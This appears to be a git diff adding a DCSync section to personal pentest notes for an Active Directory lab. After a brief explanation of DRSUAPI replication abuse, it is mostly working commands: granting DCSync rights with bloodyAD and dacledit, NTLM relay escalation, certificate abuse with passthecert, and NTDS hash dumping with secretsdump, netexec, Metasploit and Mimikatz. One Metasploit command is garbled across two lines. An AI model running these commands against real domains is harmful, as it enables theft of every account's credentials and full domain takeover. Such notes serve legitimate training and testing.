@@ -123,3 +123,76 @@ impacket-ntlmrelayx -6 -t ldaps://192.168.154.134 -wh fakewpad.marvel.local -l l
 
 #wait somebody to login or reboot machine.
 ```
+
+
+
+#### DCSync Attack :
+```bash
+A DCsync attack is a technique where an attacker pretends to be a Domain Controller (DC) and asks the real DC to replicate password data for certain users — including NTLM password hashes, Kerberos keys, and cleartext passwords (if stored)
+
+It abuses the Microsoft Directory Replication Service (DRS) Remote Protocol (`DRSUAPI`) — which is meant for DCs to synchronize Active Directory data.
+
+Domain Admins, Enterprise Admins, and the Domain Controllers group have this.
+Misconfigured permissions can let non-admin users do this.
+
+- The attacker tool sends a DRSUAPI request to the DC.
+- The DC thinks: "Oh, you’re a trusted DC wanting to sync — here’s the password database."
+- It returns password hashes for the requested accounts.
+
+#settings for attack
+- Open Active Directory Users and Computers Press Win + R, type dsa.msc, and press Enter.
+- Enable Advanced Features, in the top menu, go to View and select Advanced Features.
+- Locate the Domain Object, navigate to the root of the domain (e.g., ignite.local).
+
+#if you have any domain admins and administrator credentials make any non admin user misconfigure.
+
+sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' add dcsync fcastle
+
+#remove non admin user from misconfig
+sudo bloodyAD --host 192.168.154.134 -d MARVEL.local -u Administrator -p 'P@$$w0rd' remove dcsync fcastle
+
+
+#using impacket-dacledit add:
+impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action write -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134
+
+#remove impacket-dacledit remove:
+impacket-dacledit Marvel.local/Administrator:'P@$$w0rd' -action remove -rights DCSync -principal fcastle -target-dn 'DC=Marvel,DC=local' -dc-ip 192.168.154.134
+
+
+#using relay:
+impacket-ntlmrelayx -t ldap://192.168.154.134 --escalate-user
+
+#using pfx to gain DCSync privilege:
+
+#search for .pfx file
+Get-ADUser -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }
+
+Get-ADComputer -Filter * -Properties userCertificate | Where-Object { $_.userCertificate -ne $null }
+
+#if find any .pfx flie tranfer to attacker machine.
+certipy-ad cert -pfx administrator.pfx -nokey -out "user.crt"
+certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"
+
+#pass the extracted cert to dc for modify user object.
+./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate
+
+#Emunerate if compromised account have replication permission.
+bloodhound-python -u aarti -p Password@1 -ns 192.168.1.48 -d ignite.local -c All
+
+#exploit using secretsdump:
+impacket-secretsdump 'ignite.local'/'aarti':'Password@1'@'192.168.1.48'
+
+#Netexec validate permissions
+nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds
+nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator
+
+
+#metasploit 
+msfconsadmin
+ole -x "use auxiliary/scanner/smb/impacket/secretsdump; set RHOSTS 192.168.1.48; set SMBUser aarti; set SMBPass Password@1; run"
+
+#using Mimikatz
+privilege::debug
+lsadump::dcsync /user:<target_user>
+lsadump::dcsync /domain:ignite.local /user:krbtgt
+```
